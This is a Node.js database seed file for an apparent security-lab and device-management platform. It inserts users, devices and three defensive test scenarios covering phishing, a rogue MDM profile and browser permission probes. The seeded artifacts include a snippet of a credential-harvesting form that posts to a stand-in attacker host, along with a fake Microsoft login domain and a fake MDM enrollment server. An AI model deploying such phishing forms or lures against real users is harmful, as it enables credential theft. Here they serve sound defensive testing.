const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { DatabaseSync } = require('node:sqlite');
const config = require('../config');

// Ensure directory exists for persistent volume mounts
fs.mkdirSync(path.dirname(config.DB_PATH), { recursive: true });

const db = new DatabaseSync(config.DB_PATH);

// Enable WAL mode and busy timeout for high concurrency and integrity
try {
  db.exec('PRAGMA journal_mode = WAL;');
  db.exec('PRAGMA busy_timeout = 10000;');
  db.exec('PRAGMA foreign_keys = ON;');
} catch (e) {
  // Pragma may be optional or managed by driver
}

function initDb() {
  const schemaPath = path.join(__dirname, 'schema.sql');
  const schemaSql = fs.readFileSync(schemaPath, 'utf8');
  db.exec(schemaSql);
  seedInitialData();
}

function seedInitialData() {
  // Check if users exist
  const userCount = db.prepare('SELECT COUNT(*) as count FROM users').get().count;
  if (userCount > 0) return;

  const now = new Date().toISOString();

  // 1. Seed RBAC Users
  const insertUser = db.prepare(`
    INSERT INTO users (id, username, full_name, role, email, api_key)
    VALUES (?, ?, ?, ?, ?, ?)
  `);

  insertUser.run('usr-cmd-01', 'commander.vance', 'Vance Sterling', 'COMMANDER', 'vance.sterling@sentinel.defense', 'sk-cmd-9a4f7e21b8c6');
  insertUser.run('usr-inv-02', 'investigator.chen', 'Elena Chen', 'INVESTIGATOR', 'elena.chen@sentinel.defense', 'sk-inv-3c8d1e5b7a90');
  insertUser.run('usr-ana-03', 'analyst.marcus', 'Marcus Thorne', 'ANALYST', 'marcus.thorne@sentinel.defense', 'sk-ana-8f2c6a4d1e70');
  insertUser.run('usr-aud-04', 'auditor.novak', 'Sarah Novak', 'AUDITOR', 'sarah.novak@sentinel.defense', 'sk-aud-5e7b9c1d3f24');

  // 2. Seed Devices (Corporate Enrolled and Synthetic Lab Devices)
  const insertDevice = db.prepare(`
    INSERT INTO devices (
      id, device_name, serial_number, udid, platform, os_version,
      enrollment_status, is_lab_device, assigned_user, hardware_model,
      ip_address, mac_address, enrollment_token, cert_fingerprint, last_seen, enrolled_at
    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
  `);

  // Lab Test Devices (Isolated Cyber Range)
  insertDevice.run(
    'dev-lab-01',
    'LAB-MAC-M3-SANDBOX-01',
    'C02G99LAB001',
    '33B76529-6C10-4A0E-94BB-2B86E80DA671',
    'macos',
    'macOS 15.0.1 Sequoia',
    'ENROLLED',
    1,
    'Synthetic Security Tester (Lab)',
    'MacBook Pro 16" (Apple M3 Max)',
    '10.240.10.15',
    '00:1A:2B:3C:4D:01',
    'LAB-ENROLL-TOK-MAC-01',
    'SHA256:4A:8B:9C:2D:1E:0F:7A:3C:5E:8B:1A:4C:6E:9F:2D:8A',
    now,
    '2026-09-01T08:00:00Z'
  );

  insertDevice.run(
    'dev-lab-02',
    'LAB-WIN11-EDGE-GUARD-02',
    'W11-LAB-SEC-7741',
    '8F617DE4-3CA9-4C49-B104-5BC241CEE12F',
    'windows',
    'Windows 11 Enterprise 23H2',
    'ENROLLED',
    1,
    'Synthetic Windows Tester (Lab)',
    'Dell Precision 5680 (Core i9)',
    '10.240.10.16',
    '00:1A:2B:3C:4D:02',
    'LAB-ENROLL-TOK-WIN-02',
    'SHA256:7B:3A:9C:1D:5E:2F:8A:4C:6E:1B:3D:7F:9A:2C:4E:8B',
    now,
    '2026-09-02T09:30:00Z'
  );

  insertDevice.run(
    'dev-lab-03',
    'LAB-ANDROID-PIXEL-SANDBOX-03',
    'PXL9-LAB-5590',
    'A99C0214-7A9B-4D12-88E3-13D94FF4CA88',
    'android',
    'Android 15 (AP3A.241005)',
    'ENROLLED',
    1,
    'Synthetic Mobile Sandbox (Lab)',
    'Google Pixel 9 Pro',
    '10.240.10.17',
    '00:1A:2B:3C:4D:03',
    'LAB-ENROLL-TOK-AND-03',
    'SHA256:1C:4E:8A:2F:9B:3D:7A:5C:8E:2B:4F:1A:6D:9C:3E:7A',
    now,
    '2026-09-05T11:15:00Z'
  );

  // Corporate Production Enrolled Devices
  insertDevice.run(
    'dev-corp-01',
    'CORP-FINANCE-LAPTOP-104',
    'C02DX899CORP1',
    '7A981B24-34CC-47A1-8051-645E99DA31C9',
    'macos',
    'macOS 14.6.1 Sonoma',
    'ENROLLED',
    0,
    'david.miller@corp-acme.internal',
    'MacBook Air 15" (M2)',
    '172.16.45.88',
    '00:1A:2B:88:99:AA',
    'CORP-MDM-TOK-M2-8871',
    'SHA256:88:99:AA:BB:CC:DD:EE:FF:00:11:22:33:44:55:66:77',
    now,
    '2026-01-15T10:00:00Z'
  );

  insertDevice.run(
    'dev-corp-02',
    'CORP-EXEC-SURFACE-09',
    'MS-SURF-99124',
    '3F2148CA-2311-4890-84E1-99B774E120A1',
    'windows',
    'Windows 11 Pro 23H2',
    'ENROLLED',
    0,
    'claire.redfield@corp-acme.internal',
    'Surface Laptop Studio 2',
    '172.16.45.102',
    '00:1A:2B:AA:BB:CC',
    'CORP-INTUNE-TOK-99124',
    'SHA256:99:AA:BB:CC:DD:EE:FF:00:11:22:33:44:55:66:77:88',
    now,
    '2026-02-20T14:22:00Z'
  );

  insertDevice.run(
    'dev-corp-03',
    'CORP-IPHONE-SEC-DIR',
    'F2LXM012CORP9',
    'C871A094-11EE-4190-8411-9876543210AB',
    'ios',
    'iOS 18.0.1',
    'ENROLLED',
    0,
    'sarah.connor@corp-acme.internal',
    'iPhone 16 Pro',
    '172.16.45.115',
    '00:1A:2B:CC:DD:EE',
    'CORP-APNS-TOK-7721',
    'SHA256:AA:BB:CC:DD:EE:FF:00:11:22:33:44:55:66:77:88:99',
    now,
    '2026-03-10T16:05:00Z'
  );

  // 3. Seed Lab Scenarios (Controlled Laboratory with Synthetic Data)
  const insertScenario = db.prepare(`
    INSERT INTO lab_scenarios (
      id, scenario_name, category, description, synthetic_user, attack_vector,
      browser_protections_tested, permission_boundaries_tested, synthetic_artifacts, last_run_at, last_result
    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
  `);

  insertScenario.run(
    'scen-01',
    'Credential Harvesting & Autofill Boundary Test',
    'PHISHING_HARVEST',
    'Tests browser domain isolation and autofill safeguards when encountering a deceptive clone login portal. Demonstrates how modern browsers isolate credentials to the exact Origin.',
    JSON.stringify({
      user: 'alice.investor@synthetic-corp.test',
      synthetic_pwd_hash: 'bcrypt:$2a$12$syntheticHashExampleNotRealPwd',
      mock_cookies: ['session_id=SYNTH-99418; SameSite=Strict; Secure; HttpOnly'],
      target_portal: 'https://login.microsoftonline.com.phish-auth-test.dev'
    }),
    'Fake Microsoft 365 OAuth & Form Impersonation',
    JSON.stringify({
      same_origin_policy: 'Origin mismatch prevents credential manager autofill without user confirmation',
      cookie_isolation: 'HttpOnly and SameSite=Strict prevent script reading or cross-site leakage',
      form_hijack_prevention: 'CSP header form-action restricted to authorized identity provider'
    }),
    JSON.stringify({
      file_system: 'Strictly prohibited: visiting phishing page has zero access to C:\\ or /Users',
      camera_microphone: 'Blocked by Permissions API: requires explicit user interaction gesture and prompt',
      clipboard: 'navigator.clipboard.readText() requires active document focus and user grant'
    }),
    JSON.stringify({
      synthetic_pcap: 'synthetic-pcap-capture-session-01.pcap',
      synthetic_dom_snapshot: '<form action="http://malicious-relay.test/harvest">...'
    }),
    now,
    JSON.stringify({
      status: 'VERIFIED_ISOLATED',
      browser_sandbox_prevented_compromise: true,
      unauthorized_device_access_attempted: 'BLOCKED',
      summary: 'Browser sandbox prevented cross-origin cookie exfiltration. Zero device filesystem access.'
    })
  );

  insertScenario.run(
    'scen-02',
    'Fake MDM Profile & Malicious Config Vector',
    'DEVICE_MANAGEMENT_SOCIAL_ENG',
    'Evaluates social engineering where threat actor prompts user to install a rogue .mobileconfig / MDM profile under the guise of "IT Security Update".',
    JSON.stringify({
      user: 'bob.developer@synthetic-corp.test',
      device_model: 'MacBook Pro (Lab Synthetic)',
      mock_mdm_server: 'https://enroll.malicious-mdm-portal.test'
    }),
    'Deceptive Mobile Device Management Enrollment Profile (.mobileconfig)',
    JSON.stringify({
      browser_boundary: 'Browser downloads .mobileconfig as inactive file; CANNOT install silently',
      user_confirmation_gate: 'OS Settings prompts with unverified profile warning and administrative password prompt',
      mdm_integrity_check: 'Cryptographic CA signature check alerts user of untrusted root authority'
    }),
    JSON.stringify({
      system_profile_store: 'Requires Administrator credentials and manual confirmation in System Settings',
      kernel_privileges: 'Completely inaccessible without full Root / SIP override'
    }),
    JSON.stringify({
      mock_profile_xml: '<?xml version="1.0" encoding="UTF-8"?><dict><key>PayloadType</key><string>Configuration</string></dict>'
    }),
    now,
    JSON.stringify({
      status: 'VERIFIED_ISOLATED',
      browser_sandbox_prevented_compromise: true,
      unauthorized_device_access_attempted: 'BLOCKED_BY_OS_GATE',
      summary: 'Browser isolated download; macOS/Windows gatekeeper blocked unverified profile installation.'
    })
  );

  insertScenario.run(
    'scen-03',
    'Malicious Script Web API & Device Permission Probing',
    'SANDBOX_PERMISSION_PROBE',
    'Simulates a rogue phishing script attempting to invoke navigator.mediaDevices.getUserMedia(), navigator.geolocation, and window.showOpenFilePicker().',
    JSON.stringify({
      user: 'charlie.security@synthetic-corp.test',
      browser: 'Chromium 130.0 Sandbox',
      mock_environment: 'Controlled Lab Isolated Frame'
    }),
    'Hostile JavaScript Web API Probe for Microphone, Camera, Location, and Local Disk',
    JSON.stringify({
      permissions_api_sandbox: 'All sensitive hardware APIs trigger strict user permission dialogs; silent access is rejected by browser core',
      filesystem_access_api: 'showOpenFilePicker() requires explicit user gesture (button click) and user file selection',
      storage_isolation: 'localStorage and IndexedDB are partitioned per top-level domain'
    }),
    JSON.stringify({
      disk_io: 'Zero silent filesystem traversal possible; sandboxed renderer process has no POSIX read/write access to host files',
      webcam_mic: 'Hardware status light activated only if user explicitly clicks Allow'
    }),
    JSON.stringify({
      probe_logs: [
        'Attempted: navigator.mediaDevices.getUserMedia() -> Result: Prompt Rejected / Synthetic Mock Denied',
        'Attempted: window.showOpenFilePicker() -> Result: SecurityError: Must be handling a user gesture',
        'Attempted: navigator.geolocation.getCurrentPosition() -> Result: Denied by Policy'
      ]
    }),
    now,
    JSON.stringify({
      status: 'VERIFIED_ISOLATED',
      browser_sandbox_prevented_compromise: true,
      unauthorized_device_access_attempted: 'DENIED_BY_WEB_PERMISSIONS_API',
      summary: 'All probe attempts intercepted by browser permission boundaries. No sensitive telemetry leaked.'
    })
  );

  // 4. Seed Genesis Audit Log with Cryptographic Hash
  const genesisHash = crypto.createHash('sha256').update('GENESIS_BLOCK_AEGIS_SENTINEL_' + now).digest('hex');
  const insertAudit = db.prepare(`
    INSERT INTO audit_logs (
      id, event_type, actor_id, actor_role, target_entity_type, target_entity_id,
      action, details, ip_address, tamper_hash, created_at
    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
  `);

  insertAudit.run(
    'audit-genesis-00',
    'SYSTEM_INITIALIZATION',
    'SYSTEM',
    'SYSTEM',
    'SYSTEM',
    'NODE_01',
    'INITIALIZE_SECURE_STORAGE',
    JSON.stringify({
      version: '1.0.0',
      status: 'INITIALIZED',
      cipher_suite: 'AES-256-GCM',
      mac: 'HMAC-SHA256',
      retention_default_days: config.DEFAULT_RETENTION_DAYS,
      active_enrolled_devices: 6
    }),
    '127.0.0.1',
    genesisHash,
    now
  );

  console.log('[AEGIS-DB] Database initialized and seeded with verified devices, lab scenarios, and audit genesis block.');
}

// Call on startup
initDb();

module.exports = db;
